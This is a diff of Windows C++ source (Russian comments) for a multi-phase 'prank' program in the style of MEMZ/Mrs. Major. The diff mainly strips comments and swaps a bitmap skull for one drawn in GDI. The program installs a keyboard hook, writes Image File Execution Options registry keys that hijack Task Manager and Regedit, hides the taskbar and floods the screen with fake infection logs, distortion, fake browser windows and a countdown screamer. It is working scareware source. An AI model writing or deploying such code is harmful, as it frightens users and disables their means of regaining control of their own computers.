@@ -25,10 +25,9 @@
 #pragma comment(linker, "/ENTRY:wWinMainCRTStartup")
 
 // ============================================================
-// РЕСУРСЫ (нужно создать resource.rc)
+// РЕСУРСЫ
 // ============================================================
 #define IDR_RANSOM 1001
-#define IDR_SKULL  1002
 
 // ============================================================
 // КОНФИГ
@@ -47,30 +46,24 @@ namespace Cfg {
 // ============================================================
 std::atomic<bool> g_stop{false};
 std::atomic<bool> g_audioStop{false};
-std::atomic<int>  g_audioMode{0};      // 0=bytebeat, 1=тишина
+std::atomic<int>  g_audioMode{0};
 std::atomic<int>  g_byteFormula{0};
 std::atomic<int>  g_volume{100};
 
 HHOOK      g_kbHook = nullptr;
 HINSTANCE  g_hInst  = nullptr;
-HWND       g_skipWnd = nullptr;        // окно для MessageBox-цикла
 
-const wchar_t* SKIP_CLASS  = L"SkipClass";
 const wchar_t* IE_CLASS    = L"IEClass";
 const wchar_t* RULES_CLASS = L"RulesClass";
 const wchar_t* BLOOD_CLASS = L"BloodClass";
+const wchar_t* BLOCKS_CLASS = L"BlocksClass";
 
-// Для фаз 3–4
-std::atomic<bool> g_showIe1{false};
-std::atomic<bool> g_showIe2{false};
-std::atomic<bool> g_showIe3{false};
-std::atomic<bool> g_showRules{false};
-std::atomic<int>  g_textStretch{0};    // сколько пробелов добавлять
+std::atomic<int>  g_textStretch{0};
 std::atomic<int>  g_countdown{30};
-std::atomic<int>  g_magentaAlpha{0};   // 0-60
-std::atomic<int>  g_redAlpha{0};       // 0-60
-std::atomic<int>  g_whiteBlocks{0};    // 0-50
-std::atomic<int>  g_vignette{0};       // 0-100
+std::atomic<int>  g_magentaAlpha{0};
+std::atomic<int>  g_redAlpha{0};
+std::atomic<int>  g_whiteBlocks{0};
+std::atomic<int>  g_vignette{0};
 std::atomic<int>  g_flickerOn{0};
 std::atomic<int>  g_bloodCount{0};
 
@@ -97,8 +90,6 @@ void HideTaskbar();
 void ShowTaskbar();
 DWORD BytebeatSample(int idx, DWORD t);
 void AudioThread();
-void MessageBoxCycleThread();
-LRESULT CALLBACK SkipProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK IeProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK RulesProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK BloodProc(HWND, UINT, WPARAM, LPARAM);
@@ -110,9 +101,6 @@ void Phase3_RgbChaos();
 void Phase4_MrsMajor();
 void DoReboot();
 void WatchdogThread();
-void FpsCounterThread();
-
-std::atomic<int> g_fps{0};
 
 // ============================================================
 // УТИЛИТЫ
@@ -168,11 +156,10 @@ void RemoveKbHook() {
 }
 
 // ============================================================
-// IFEO — подмена taskmgr и regedit
+// IFEO
 // ============================================================
 void SetupIFEO() {
     HKEY h;
-    // taskmgr → cmd с сообщением
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe",
         0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
@@ -181,7 +168,6 @@ void SetupIFEO() {
                        (DWORD)((wcslen(dbg)+1)*sizeof(wchar_t)));
         RegCloseKey(h);
     }
-    // regedit → notepad с текстом
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe",
         0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
@@ -222,7 +208,7 @@ void ShowTaskbar() {
 // ============================================================
 DWORD BytebeatSample(int idx, DWORD t) {
     switch (idx) {
-        case 0: return 128;  // тишина
+        case 0: return 128;
         case 1: return (((t >> 8) | (t >> 9) | (t * (t >> 13))) & 0xFF);
         case 2: return (((t ^ (t >> 3)) * (t >> 8)) & 0xFF);
         case 3: return ((t >> 12) & 0xFF);
@@ -312,10 +298,9 @@ DWORD WINAPI MsgBoxThread2(LPVOID) {
 }
 
 // ============================================================
-// ФАЗА 1: пикселизация + тряска
+// ФАЗА 1
 // ============================================================
 void Phase1_PixelShake() {
-    // Запускаем 2 потока MessageBox
     std::thread t1(MsgBoxThread1);
     std::thread t2(MsgBoxThread2);
     t1.detach(); t2.detach();
@@ -331,7 +316,6 @@ void Phase1_PixelShake() {
     HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
     HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
 
-    // Небольшой буфер для пикселизации
     const int BUFW = 480, BUFH = 270;
     HDC hSmall = CreateCompatibleDC(hScreen);
     HBITMAP bmpSmall = CreateCompatibleBitmap(hScreen, BUFW, BUFH);
@@ -339,15 +323,12 @@ void Phase1_PixelShake() {
 
     DWORD start = GetTickCount();
     while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kPhase1Ms) {
-        // Снимок экрана
         BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);
 
-        // Пикселизация нарастает: от 4 до 80 блоков по ширине
         double p = (double)(GetTickCount() - start) / Cfg::kPhase1Ms;
-        int blocks = (int)(240 - 160 * p);  // от 240 до 80 блоков
+        int blocks = (int)(240 - 160 * p);
         if (blocks < 30) blocks = 30;
 
-        // Растягиваем с уменьшением цветов — это даёт пиксель
         SetStretchBltMode(hSmall, COLORONCOLOR);
         StretchBlt(hSmall, 0, 0, blocks, blocks * sh / sw,
                    hMem, 0, 0, sw, sh, SRCCOPY);
@@ -355,7 +336,6 @@ void Phase1_PixelShake() {
         StretchBlt(hScreen, 0, 0, sw, sh,
                    hSmall, 0, 0, blocks, blocks * sh / sw, SRCCOPY);
 
-        // Тряска
         int dx = (rand() % 5) - 2;
         int dy = (rand() % 5) - 2;
         BitBlt(hScreen, dx, dy, sw, sh, hMem, 0, 0, SRCCOPY);
@@ -366,46 +346,21 @@ void Phase1_PixelShake() {
     SelectObject(hMem, old); DeleteObject(bmp); DeleteDC(hMem);
     SelectObject(hSmall, oldS); DeleteObject(bmpSmall); DeleteDC(hSmall);
     ReleaseDC(nullptr, hScreen);
-
-    g_stop = true;   // останавливаем MessageBox-потоки
-    g_stop = false;  // но программа продолжает
-    // Примечание: окна закроются сами, когда пользователь кликнет
 }
 
 // ============================================================
-// ФАЗА 2: заражение
+// ФАЗА 2: заражение + череп на GDI
 // ============================================================
 void Phase2_Infection() {
-    // Запускаем Ransom Timer (если ресурс есть)
     PlaySoundW(MAKEINTRESOURCEW(IDR_RANSOM), g_hInst,
                SND_RESOURCE | SND_ASYNC | SND_NODEFAULT);
 
-    // Останавливаем bytebeat
     g_audioMode = 1;
 
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
     HDC hScreen = GetDC(nullptr);
 
-    // Загружаем череп
-    HBITMAP hSkull = nullptr;
-    {
-        HRSRC r = FindResourceW(g_hInst, MAKEINTRESOURCEW(IDR_SKULL), RT_RCDATA);
-        if (r) {
-            HGLOBAL g = LoadResource(g_hInst, r);
-            if (g) {
-                void* data = LockResource(g);
-                DWORD sz = SizeofResource(g_hInst, r);
-                // Пробуем как BMP
-                HDC hMem = CreateCompatibleDC(hScreen);
-                hSkull = (HBITMAP)LoadImageW(nullptr, L"skull.bmp", IMAGE_BITMAP,
-                                             0, 0, LR_LOADFROMFILE | LR_CREATEDIBSECTION);
-                DeleteDC(hMem);
-            }
-        }
-    }
-
-    // Лог
     std::vector<std::wstring> logLines;
     const wchar_t* files[] = {
         L"C:\\Windows\\System32\\kernel32.dll",
@@ -434,11 +389,9 @@ void Phase2_Infection() {
     while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kPhase2Ms) {
         DWORD elapsed = GetTickCount() - start;
 
-        // Красный фильтр — нарастает
         int alpha = (int)(50.0 * elapsed / Cfg::kPhase2Ms);
         g_redAlpha = alpha;
 
-        // Рисуем красный фильтр через AlphaBlend
         HDC hMem = CreateCompatibleDC(hScreen);
         HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
         HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
@@ -455,37 +408,117 @@ void Phase2_Infection() {
         BLENDFUNCTION bf = { AC_SRC_OVER, 0, (BYTE)alpha, 0 };
         AlphaBlend(hMem, 0, 0, sw, sh, hRed, 0, 0, sw, sh, bf);
 
-        // Череп
-        if (hSkull) {
-            HDC hS = CreateCompatibleDC(hScreen);
-            HBITMAP oS = (HBITMAP)SelectObject(hS, hSkull);
-            BITMAP bm; GetObject(hSkull, sizeof(bm), &bm);
-            int cx = (sw - bm.bmWidth) / 2;
-            int cy = (sh - bm.bmHeight) / 2;
-            BLENDFUNCTION bfS = { AC_SRC_OVER, 0, 200, 0 };
-            AlphaBlend(hMem, cx, cy, bm.bmWidth, bm.bmHeight,
-                       hS, 0, 0, bm.bmWidth, bm.bmHeight, bfS);
-            SelectObject(hS, oS);
-            DeleteDC(hS);
-        } else {
-            // Fallback — рисуем череп примитивами
-            HBRUSH wb = CreateSolidBrush(RGB(230, 230, 230));
-            HGDIOBJ ob = SelectObject(hMem, wb);
-            HPEN op = (HPEN)SelectObject(hMem, GetStockObject(NULL_PEN));
-            int cx = sw/2, cy = sh/2;
-            // Череп — эллипс
-            Ellipse(hMem, cx-100, cy-120, cx+100, cy+80);
-            // Глаза
-            HBRUSH bb = CreateSolidBrush(RGB(0, 0, 0));
-            SelectObject(hMem, bb);
-            Ellipse(hMem, cx-60, cy-70, cx-20, cy-20);
-            Ellipse(hMem, cx+20, cy-70, cx+60, cy-20);
-            // Рот
-            SelectObject(hMem, bb);
-            Rectangle(hMem, cx-40, cy+20, cx+40, cy+40);
-            SelectObject(hMem, ob); SelectObject(hMem, op);
-            DeleteObject(wb); DeleteObject(bb);
+        // ================= ЧЕРЕП НА GDI =================
+        {
+            int cx = sw / 2;
+            int cy = sh / 2;
+            int R = min(sw, sh) / 6;
+
+            // Красная аура вокруг черепа
+            for (int i = 25; i > 0; --i) {
+                int auraAlpha = 30 - i;
+                if (auraAlpha < 0) auraAlpha = 0;
+                if (auraAlpha > 60) auraAlpha = 60;
+                HBRUSH auraB = CreateSolidBrush(RGB(150, 0, 0));
+                HPEN auraP = CreatePen(PS_SOLID, 1, RGB(150, 0, 0));
+                HGDIOBJ ao = SelectObject(hMem, auraB);
+                HGDIOBJ ap = SelectObject(hMem, auraP);
+                int rr = R + i * 4;
+                Ellipse(hMem, cx - rr, cy - rr - 30, cx + rr, cy + rr + 30);
+                SelectObject(hMem, ao);
+                SelectObject(hMem, ap);
+                DeleteObject(auraB);
+                DeleteObject(auraP);
+            }
+
+            // Основной купол черепа
+            HBRUSH skullBrush = CreateSolidBrush(RGB(225, 225, 220));
+            HPEN   skullPen   = CreatePen(PS_SOLID, 3, RGB(70, 70, 70));
+            HGDIOBJ so = SelectObject(hMem, skullBrush);
+            HGDIOBJ sp = SelectObject(hMem, skullPen);
+
+            // Верхняя часть (купол)
+            Ellipse(hMem, cx - R, cy - R - 20, cx + R, cy + R - 40);
+
+            // Челюсть
+            RoundRect(hMem, cx - R + 30, cy + R - 70,
+                      cx + R - 30, cy + R + 40, 25, 25);
+
+            SelectObject(hMem, so);
+            SelectObject(hMem, sp);
+            DeleteObject(skullBrush);
+            DeleteObject(skullPen);
+
+            // Глазницы
+            HBRUSH eyeHole = CreateSolidBrush(RGB(5, 0, 0));
+            HPEN   eyePen  = CreatePen(PS_SOLID, 2, RGB(0, 0, 0));
+            HGDIOBJ eo = SelectObject(hMem, eyeHole);
+            HGDIOBJ ep = SelectObject(hMem, eyePen);
+
+            int eyeW = R / 2;
+            int eyeH = R / 2 + 15;
+            int eyeY = cy - R / 3;
+
+            Ellipse(hMem, cx - R/2 - eyeW/2, eyeY,
+                          cx - R/2 + eyeW/2, eyeY + eyeH);
+            Ellipse(hMem, cx + R/2 - eyeW/2, eyeY,
+                          cx + R/2 + eyeW/2, eyeY + eyeH);
+
+            SelectObject(hMem, eo);
+            SelectObject(hMem, ep);
+            DeleteObject(eyeHole);
+            DeleteObject(eyePen);
+
+            // Красные зрачки
+            HBRUSH pupil = CreateSolidBrush(RGB(255, 0, 0));
+            HGDIOBJ po = SelectObject(hMem, pupil);
+            HPEN np = (HPEN)SelectObject(hMem, GetStockObject(NULL_PEN));
+
+            int pR = R / 8;
+            int pY = eyeY + eyeH / 2;
+            Ellipse(hMem, cx - R/2 - pR, pY - pR, cx - R/2 + pR, pY + pR);
+            Ellipse(hMem, cx + R/2 - pR, pY - pR, cx + R/2 + pR, pY + pR);
+
+            SelectObject(hMem, po);
+            SelectObject(hMem, np);
+            DeleteObject(pupil);
+
+            // Нос (треугольник)
+            HBRUSH noseB = CreateSolidBrush(RGB(10, 0, 0));
+            HGDIOBJ no = SelectObject(hMem, noseB);
+            POINT nosePts[3] = {
+                { cx, cy + R / 4 },
+                { cx - R / 7, cy + R / 2 },
+                { cx + R / 7, cy + R / 2 }
+            };
+            Polygon(hMem, nosePts, 3);
+            SelectObject(hMem, no);
+            DeleteObject(noseB);
+
+            // Зубы
+            HPEN toothPen = CreatePen(PS_SOLID, 3, RGB(60, 60, 60));
+            HGDIOBJ to = SelectObject(hMem, toothPen);
+            int teethY1 = cy + R + 0;
+            int teethY2 = cy + R + 30;
+            for (int i = -3; i <= 3; ++i) {
+                int x = cx + i * (R / 4);
+                MoveToEx(hMem, x, teethY1, nullptr);
+                LineTo(hMem, x, teethY2);
+            }
+            SelectObject(hMem, to);
+            DeleteObject(toothPen);
+
+            // Трещина
+            HPEN crackPen = CreatePen(PS_SOLID, 2, RGB(70, 70, 70));
+            HGDIOBJ co = SelectObject(hMem, crackPen);
+            MoveToEx(hMem, cx - R/3, cy - R - 15, nullptr);
+            LineTo(hMem, cx - R/4, cy - R/2);
+            LineTo(hMem, cx - R/3, cy - R/6);
+            LineTo(hMem, cx - R/5, cy + R/8);
+            SelectObject(hMem, co);
+            DeleteObject(crackPen);
         }
+        // ================= /ЧЕРЕП =================
 
         // Лог
         HFONT f = CreateFontW(16, 0, 0, 0, FW_BOLD, 0, 0, 0,
@@ -501,7 +534,6 @@ void Phase2_Infection() {
             bool infected = logLines[i].find(L"INFECTED") != std::wstring::npos;
             SetTextColor(hMem, infected ? RGB(255, 0, 0) : RGB(0, 255, 0));
             TextOutW(hMem, 20, y, logLines[i].c_str(), (int)logLines[i].size());
-            // Вспышка при новой INFECTED
             if (infected && i > lastLog && (i % 3 == 0)) {
                 HBRUSH fl = CreateSolidBrush(RGB(255, 0, 0));
                 RECT rf = { 0, 0, sw, sh };
@@ -512,7 +544,6 @@ void Phase2_Infection() {
         }
         SelectObject(hMem, of); DeleteObject(f);
 
-        // Выводим
         BitBlt(hScreen, 0, 0, sw, sh, hMem, 0, 0, SRCCOPY);
 
         SelectObject(hMem, old); DeleteObject(bmp); DeleteDC(hMem);
@@ -536,14 +567,12 @@ void Phase2_Infection() {
         Sleep(60);
     }
 
-    // Останавливаем Ransom Timer
     PlaySoundW(nullptr, nullptr, 0);
-    if (hSkull) DeleteObject(hSkull);
     ReleaseDC(nullptr, hScreen);
 }
 
 // ============================================================
-// ФАЗА 3: RGB + IE + magenta
+// ФАЗА 3
 // ============================================================
 void Phase3_RgbChaos() {
     g_audioMode = 0;
@@ -573,11 +602,10 @@ void Phase3_RgbChaos() {
     while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kPhase3Ms) {
         DWORD elapsed = GetTickCount() - start;
 
-        // RGB пикселизация
         BitBlt(hSmall, 0, 0, BUFW, BUFH, hScreen, 0, 0, SRCCOPY);
         GetDIBits(hSmall, bmpSmall, 0, BUFH, pixels.data(), &bi, DIB_RGB_COLORS);
         for (int i = 0; i < BUFW * BUFH; ++i) {
-            int ch = rand() % 3;  // 0=R, 1=G, 2=B
+            int ch = rand() % 3;
             unsigned char v = pixels[i*4 + (2-ch)];
             pixels[i*4+0] = (ch == 2) ? v : 0;
             pixels[i*4+1] = (ch == 1) ? v : 0;
@@ -587,11 +615,9 @@ void Phase3_RgbChaos() {
         SetStretchBltMode(hScreen, COLORONCOLOR);
         StretchBlt(hScreen, 0, 0, sw, sh, hSmall, 0, 0, BUFW, BUFH, SRCCOPY);
 
-        // Magenta-фильтр
         if (elapsed > 3000) {
             int alpha = (int)(60.0 * (elapsed - 3000) / (Cfg::kPhase3Ms - 3000));
             if (elapsed > Cfg::kPhase3Ms - 5000) {
-                // затухание
                 alpha = (int)(60.0 * (Cfg::kPhase3Ms - elapsed) / 5000.0);
             }
             if (alpha < 0) alpha = 0;
@@ -616,28 +642,22 @@ void Phase3_RgbChaos() {
             SelectObject(hM, oM); DeleteObject(bM); DeleteDC(hM);
         }
 
-        // IE-окна
         int shouldShow = (int)(elapsed / 3000);
         if (shouldShow > lastIe) {
-            if (lastIe == 0 && !g_showIe1.load()) {
-                g_showIe1 = true;
+            if (lastIe == 0) {
                 PostMessageW(g_fakeIe1, WM_USER + 1, 0, 0);
-            } else if (lastIe == 1 && !g_showIe2.load()) {
-                g_showIe2 = true;
+            } else if (lastIe == 1) {
                 PostMessageW(g_fakeIe2, WM_USER + 1, 0, 0);
-            } else if (lastIe == 2 && !g_showIe3.load()) {
-                g_showIe3 = true;
+            } else if (lastIe == 2) {
                 PostMessageW(g_fakeIe3, WM_USER + 1, 0, 0);
             }
             lastIe++;
         }
 
-        // Растяжение текста
         if (elapsed > 6000) {
             g_textStretch = (int)((elapsed - 6000) / 300);
         }
 
-        // Белые блоки
         if (elapsed > 9000) {
             g_whiteBlocks = (int)((elapsed - 9000) / 500);
             if (g_whiteBlocks > 50) g_whiteBlocks = 50;
@@ -647,7 +667,6 @@ void Phase3_RgbChaos() {
         Sleep(80);
     }
 
-    // Скрываем IE-окна
     if (g_fakeIe1) ShowWindow(g_fakeIe1, SW_HIDE);
     if (g_fakeIe2) ShowWindow(g_fakeIe2, SW_HIDE);
     if (g_fakeIe3) ShowWindow(g_fakeIe3, SW_HIDE);
@@ -658,7 +677,7 @@ void Phase3_RgbChaos() {
 }
 
 // ============================================================
-// ФАЗА 4: Mrs. Major
+// ФАЗА 4
 // ============================================================
 void Phase4_MrsMajor() {
     HideTaskbar();
@@ -667,8 +686,6 @@ void Phase4_MrsMajor() {
     g_volume = 50;
     g_audioMode = 0;
 
-    // Показываем окно правил и кровь
-    g_showRules = true;
     PostMessageW(g_rulesWnd, WM_USER + 1, 0, 0);
     ShowWindow(g_bloodWnd, SW_SHOW);
     InvalidateRect(g_bloodWnd, nullptr, FALSE);
@@ -682,7 +699,6 @@ void Phase4_MrsMajor() {
     while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kPhase4Ms) {
         DWORD elapsed = GetTickCount() - start;
 
-        // Таймер
         int remain = 30 - (int)(elapsed / 1000);
         if (remain < 0) remain = 0;
         if (remain != lastCount) {
@@ -691,7 +707,6 @@ void Phase4_MrsMajor() {
             Beep(2000, 50);
             InvalidateRect(g_rulesWnd, nullptr, FALSE);
         }
-        // Частые тики на последних 10 сек
         if (remain <= 10) {
             static DWORD lastTick = 0;
             if (GetTickCount() - lastTick > 500) {
@@ -700,23 +715,19 @@ void Phase4_MrsMajor() {
             }
         }
 
-        // Звук нарастает
         g_volume = 50 + (int)(150.0 * elapsed / Cfg::kPhase4Ms);
         if (elapsed > Cfg::kPhase4Ms - 5000) {
             g_byteFormula = 4;
         }
 
-        // Красная пульсация
         g_redAlpha = (int)(15 + 35.0 * elapsed / Cfg::kPhase4Ms);
 
-        // Нарастание эффектов
         int p = (int)(elapsed * 100 / Cfg::kPhase4Ms);
         g_magentaAlpha = 10 + p * 40 / 100;
         g_whiteBlocks = p * 30 / 100;
         g_vignette = p;
         g_flickerOn = (p > 50);
 
-        // Мерцание
         if (g_flickerOn.load() && (rand() % 3 == 0)) {
             HDC hMem = CreateCompatibleDC(hScreen);
             HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
@@ -736,14 +747,12 @@ void Phase4_MrsMajor() {
             DeleteObject(bb);
         }
 
-        // Обновление крови
         if ((int)(elapsed / 2000) > g_bloodCount.load()) {
             g_bloodCount = (int)(elapsed / 2000) + 3;
             InvalidateRect(g_bloodWnd, nullptr, FALSE);
         }
         InvalidateRect(g_bloodWnd, nullptr, FALSE);
 
-        // Красный фильтр
         {
             HDC hMem = CreateCompatibleDC(hScreen);
             HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
@@ -775,25 +784,21 @@ void Phase4_MrsMajor() {
     g_audioMode = 0;
     SleepPump(500);
 
-    // Рисуем скример: красная вспышка + силуэт + текст
     HDC hMem = CreateCompatibleDC(hScreen);
     HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
     HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
 
-    // Красная заливка
     HBRUSH rb = CreateSolidBrush(RGB(200, 0, 0));
     RECT full = { 0, 0, sw, sh };
     FillRect(hMem, &full, rb);
     DeleteObject(rb);
 
-    // Чёрный силуэт по центру
     HBRUSH bb = CreateSolidBrush(RGB(0, 0, 0));
     HGDIOBJ ob = SelectObject(hMem, bb);
     HPEN np = (HPEN)SelectObject(hMem, GetStockObject(NULL_PEN));
     int cx = sw / 2, cy = sh / 2;
     Ellipse(hMem, cx - 200, cy - 250, cx + 200, cy + 250);
     Rectangle(hMem, cx - 250, cy + 100, cx + 250, cy + 400);
-    // Белые глаза
     HBRUSH wb = CreateSolidBrush(RGB(255, 255, 255));
     SelectObject(hMem, wb);
     Ellipse(hMem, cx - 120, cy - 80, cx - 30, cy + 30);
@@ -801,7 +806,6 @@ void Phase4_MrsMajor() {
     SelectObject(hMem, ob); SelectObject(hMem, np);
     DeleteObject(bb); DeleteObject(wb);
 
-    // Текст
     SetBkMode(hMem, TRANSPARENT);
     SetTextColor(hMem, RGB(255, 255, 255));
     HFONT f = CreateFontW(72, 0, 0, 0, FW_BOLD, 0, 0, 0,
@@ -822,7 +826,7 @@ void Phase4_MrsMajor() {
 }
 
 // ============================================================
-// ОКНО IE (кастомное)
+// ОКНО IE
 // ============================================================
 static std::wstring StretchText(const std::wstring& base, int n) {
     std::wstring out;
@@ -830,7 +834,6 @@ static std::wstring StretchText(const std::wstring& base, int n) {
     for (wchar_t c : base) {
         out += c;
         if (c == L' ' && added < n) {
-            // Добавляем до 3 пробелов за раз
             for (int k = 0; k < 3 && added < n; ++k) { out += L' '; ++added; }
         }
     }
@@ -859,7 +862,6 @@ LRESULT CALLBACK IeProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         const wchar_t* addr = (ieIndex == 2) ? L"http://go.microsoft.com/fwlink/p/?LinkId=255141"
                                              : L"http://www.example.com";
         TextOutW(dc, 40, 20, addr, (int)wcslen(addr));
-        // Контент
         SetTextColor(dc, RGB(0,0,0));
         HFONT fb = CreateFontW(20, 0, 0, 0, FW_NORMAL, 0, 0, 0,
             DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
@@ -892,7 +894,6 @@ LRESULT CALLBACK RulesProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         FillRect(dc, &rc, bg); DeleteObject(bg);
         SetBkMode(dc, TRANSPARENT);
 
-        // Дрожание
         int sx = (rand() % 3) - 1;
         int sy = (rand() % 3) - 1;
 
@@ -917,7 +918,6 @@ LRESULT CALLBACK RulesProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             TextOutW(dc, 30 + sx, 60 + i * 26 + sy, rules[i], (int)wcslen(rules[i]));
         }
 
-        // Таймер
         wchar_t tb[32];
         int rem = g_countdown.load();
         swprintf_s(tb, L"%02d:%02d", rem / 60, rem % 60);
@@ -934,7 +934,6 @@ LRESULT CALLBACK RulesProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     }
     if (m == WM_TIMER) { InvalidateRect(h, nullptr, FALSE); return 0; }
     if (m == WM_CLOSE) {
-        // Красная вспышка
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
         HDC hScreen = GetDC(nullptr);
@@ -960,11 +959,7 @@ LRESULT CALLBACK BloodProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     if (m == WM_PAINT) {
         PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
         RECT rc; GetClientRect(h, &rc);
-        // Прозрачный фон
-        HBRUSH bb = CreateSolidBrush(RGB(0, 0, 0));
-        // вместо чёрного — прозрачный
         SetBkMode(dc, TRANSPARENT);
-        // Рисуем капли
         int target = g_bloodCount.load();
         while ((int)g_drops.size() < target) {
             BloodDrop d;
@@ -979,17 +974,16 @@ LRESULT CALLBACK BloodProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             HBRUSH rb = CreateSolidBrush(RGB(120, 0, 0));
             RECT dr = { d.x, 0, d.x + d.w, d.len };
             FillRect(dc, &dr, rb);
-            // Нижняя капля
             HBRUSH r2 = CreateSolidBrush(RGB(160, 0, 0));
             Ellipse(dc, d.x - 2, d.len - 8, d.x + d.w + 2, d.len + 8);
             DeleteObject(rb); DeleteObject(r2);
             d.len += d.speed;
             if (d.len > rc.bottom) d.len = rc.bottom;
         }
-        DeleteObject(bb);
         EndPaint(h, &ps);
         return 0;
     }
+    if (m == WM_TIMER) { InvalidateRect(h, nullptr, FALSE); return 0; }
     return DefWindowProcW(h, m, w, l);
 }
 
@@ -1015,6 +1009,7 @@ LRESULT CALLBACK BlocksProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         EndPaint(h, &ps);
         return 0;
     }
+    if (m == WM_TIMER) { InvalidateRect(h, nullptr, FALSE); return 0; }
     return DefWindowProcW(h, m, w, l);
 }
 
@@ -1030,7 +1025,7 @@ void RegisterAllClasses() {
     wc.lpfnWndProc = IeProc;     wc.lpszClassName = IE_CLASS;     RegisterClassW(&wc);
     wc.lpfnWndProc = RulesProc;  wc.lpszClassName = RULES_CLASS;  RegisterClassW(&wc);
     wc.lpfnWndProc = BloodProc;  wc.lpszClassName = BLOOD_CLASS;  RegisterClassW(&wc);
-    wc.lpfnWndProc = BlocksProc; wc.lpszClassName = L"BlocksClass"; RegisterClassW(&wc);
+    wc.lpfnWndProc = BlocksProc; wc.lpszClassName = BLOCKS_CLASS; RegisterClassW(&wc);
 }
 
 // ============================================================
@@ -1088,7 +1083,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
         return 0;
     }
 
-    // ===== ФАЗА 0: Предупреждение =====
     int r = MessageBoxW(nullptr,
         L"ВНИМАНИЕ!\n\n"
         L"Это БЕЗОБИДНЫЙ ПРАНК.\n"
@@ -1103,7 +1097,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
         return 0;
     }
 
-    // ===== Инициализация =====
     InstallKbHook();
     SetupIFEO();
     CleanupIFEO_RunOnce();
@@ -1112,7 +1105,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
 
-    // Создаём IE-окна (скрытые)
     g_fakeIe1 = CreateWindowExW(WS_EX_TOPMOST, IE_CLASS, L"Ошибка сети — Internet Explorer",
         WS_OVERLAPPEDWINDOW, 100, 100, 700, 450, nullptr, nullptr, g_hInst, (LPVOID)(INT_PTR)0);
     g_fakeIe2 = CreateWindowExW(WS_EX_TOPMOST, IE_CLASS, L"Страница не может быть отображена",
@@ -1123,41 +1115,29 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
     SetTimer(g_fakeIe2, 1, 300, nullptr);
     SetTimer(g_fakeIe3, 1, 300, nullptr);
 
-    // Окно правил
     g_rulesWnd = CreateWindowExW(WS_EX_TOPMOST, RULES_CLASS, L"Mrs. Major — Правила",
         WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, sw/2 - 250, sh/2 - 200,
         500, 400, nullptr, nullptr, g_hInst, nullptr);
 
-    // Окно крови
     g_bloodWnd = CreateWindowExW(
         WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW,
         BLOOD_CLASS, L"", WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, g_hInst, nullptr);
     SetLayeredWindowAttributes(g_bloodWnd, RGB(0,0,0), 0, LWA_COLORKEY);
     SetTimer(g_bloodWnd, 1, 80, nullptr);
 
-    // Окно белых блоков
     g_blocksWnd = CreateWindowExW(
         WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW,
-        L"BlocksClass", L"", WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, g_hInst, nullptr);
+        BLOCKS_CLASS, L"", WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, g_hInst, nullptr);
     SetTimer(g_blocksWnd, 1, 200, nullptr);
 
-    // Аудио + Watchdog
     std::thread tAudio(AudioThread);
     std::thread tWatch(WatchdogThread);
 
-    // ===== ФАЗА 1 =====
     Phase1_PixelShake();
-
-    // ===== ФАЗА 2 =====
     Phase2_Infection();
-
-    // ===== ФАЗА 3 =====
     Phase3_RgbChaos();
-
-    // ===== ФАЗА 4 =====
     Phase4_MrsMajor();
 
-    // ===== ФИНАЛ =====
     g_audioMode = 1;
     g_stop = true;
     Sleep(2000);
